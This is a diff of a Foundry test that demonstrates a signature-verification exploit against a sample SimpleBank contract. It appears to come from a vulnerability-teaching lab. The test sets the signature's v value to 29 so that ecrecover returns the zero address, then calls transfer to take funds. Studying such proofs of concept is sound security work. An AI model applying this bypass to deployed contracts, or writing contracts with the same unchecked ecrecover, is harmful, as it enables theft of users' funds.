@@ -27,24 +27,25 @@ contract ContractTest is Test {
     function setUp() public {
         SimpleBankContract = new SimpleBank();
     }
-
-    function testecRecover() public {
+    function testSignatureAttack() public {
         emit log_named_decimal_uint(
             "Before exploiting, my balance",
             SimpleBankContract.getBalance(address(this)),
             18
         );
+
         bytes32 _hash = keccak256(
             abi.encodePacked("\x19Ethereum Signed Message:\n32")
         );
-        (, bytes32 r, bytes32 s) = vm.sign(1, _hash);
 
-        // If v value isn't 27 or 28. it will return address(0)
-        uint8 v = 29;
-        SimpleBankContract.transfer(address(this), 1 ether, _hash, v, r, s);
+        (uint8 _v, bytes32 _r, bytes32 _s) = vm.sign(1, _hash);
 
+        //Set v to something else apart from 27 and 28
+        _v = 29;
+
+        SimpleBankContract.transfer(address(this), 1000, _hash, _v, _r, _s);
         emit log_named_decimal_uint(
-            "After exploiting, my balance",
+            "after exploiting, my balance",
             SimpleBankContract.getBalance(address(this)),
             18
         );
